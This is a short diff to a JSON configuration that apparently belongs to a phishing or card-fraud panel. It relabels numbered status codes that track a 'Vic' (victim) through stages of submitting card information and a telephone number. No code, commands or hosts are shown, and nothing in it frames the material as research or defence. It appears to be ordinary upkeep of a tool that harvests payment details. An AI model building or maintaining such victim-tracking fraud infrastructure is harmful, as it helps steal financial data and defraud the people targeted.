@@ -671,7 +671,7 @@
     "status": [
       {
         "status": 1,
-        "meaning": "Vic Waiting... Submitted Telephone"
+        "meaning": "Vic Waiting... Submitted Card"
       },
       {
         "status": 2,
@@ -683,11 +683,11 @@
       },
       {
         "status": 4,
-        "meaning": "Vic Submitting Card Info"
+        "meaning": "Vic Submitting Telephone"
       },
       {
         "status": 5,
-        "meaning": "Vic Waiting... Submitted Card Info"
+        "meaning": "Vic Waiting... Submitted Telephone"
       },
       {
         "status": 6,
@@ -695,7 +695,7 @@
       },
       {
         "status": 7,
-        "meaning": "Vic Resubmitting Telephone"
+        "meaning": "Vic Resubmitting Card"
       },
       {
         "status": 8,
